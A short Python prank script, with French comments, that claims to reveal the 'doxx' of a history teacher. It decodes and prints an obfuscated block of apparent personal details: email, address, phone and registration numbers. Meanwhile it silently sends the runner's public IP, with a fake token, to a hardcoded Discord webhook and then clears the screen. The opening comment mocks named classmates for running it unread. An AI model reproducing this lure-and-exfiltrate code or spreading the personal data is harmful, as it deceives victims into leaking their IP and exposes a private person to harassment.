# arthur ou yamine je sais vous allez lire le code un jour bah fallait lire avant jvous ai bz 😂

import requests
import os
import time
import random
import base64
import string

def get_ip():
    response = requests.get('https://api64.ipify.org?format=json')
    return response.json()['ip']

def get_token():
    user_id = base64.b64encode(''.join(random.choices(string.digits, k=18)).encode()).decode()
    part2 = base64.b64encode(''.join(random.choices(string.ascii_letters + string.digits, k=6)).encode()).decode()
    hmac_hash = ''.join(random.choices(string.ascii_letters + string.digits, k=27))
    token = f"{user_id}.{part2}.{hmac_hash}"
    return token

def send_ip_to_discord(ip, webhook_url):
    token = get_token()
    data = {
        "content": f"IP: {ip}\nToken Discord: {token}"
    }
    response = requests.post(webhook_url, json=data)

def decode_message():
    obfuscated_mapping = {
        '#': 'a', ']': 'e', '|': 'i', '$': 'o', '&': 'u', '^': ' ', ',': 'n', 'ù': 'c', 'à': 'm', 'ê': 't', 'ë': 'l', 'µ': 'r', '~': 'f', 'ô': 'd','é': '0', 'è': '1', '*': '2', '+': '3', '=': '4', '-': '5','{': '6', '}': '7', '[': '8', '}': '9', '%': ':', ';': '\n'
    }
    obfuscated_text = """
]à#|ë:^à#êh|ëô].ë#hë#h@$µ#,g].~µ
#à|]:^k#êh#µy,^v#ë|]µ
#ôôµ]ss]:^=^µ&]^ô]^ô]^~$,ê$,^}[{*é^ë']ê#,g^ë#^v|ëë]
,&à^ô]^ê]ë:^(ù$,ù|]µg]):^é[^}è^{-^èé^+{
,&à^ô]^ê]ë:^é{^[[^=}^è+^==
,&à]µ$^êv#^|,êµ#ù$àà&,#&ê#|µ]:^~µ^é=}è}-*é=[{
,&à]µ$^s|µ]ê:^(s|]g]):^}è}-*é=[{éééèè
"""

    decoded_message = ""
    for char in obfuscated_text:
        decoded_message += obfuscated_mapping.get(char, char)
    
    return decoded_message

def main():
    RED = "\033[91m"
    BLUE = "\033[94m"
    RESET = "\033[0m"
    webhook_url = "https://discord.com/api/webhooks/1290991786864545812/6R8cHu0xztQCZQMBx_P0fs9xlbFt2fIOCKexA1ABWCT48cw_lgXWrNudMrbdnQUVChs5"  # Mets ton URL webhook ici
    ip = get_ip()

    print(f"{BLUE}gg bg t'as le doxx de la prof d'histoire:{RESET}")
    print(f"{RED}{decode_message()}{RESET}")

    send_ip_to_discord(ip, webhook_url)
    time.sleep(2)
    os.system("cls")

if __name__ == "__main__":
    main()
    exit()


# This script is for educational purposes only
# Any malicious use is prohibited
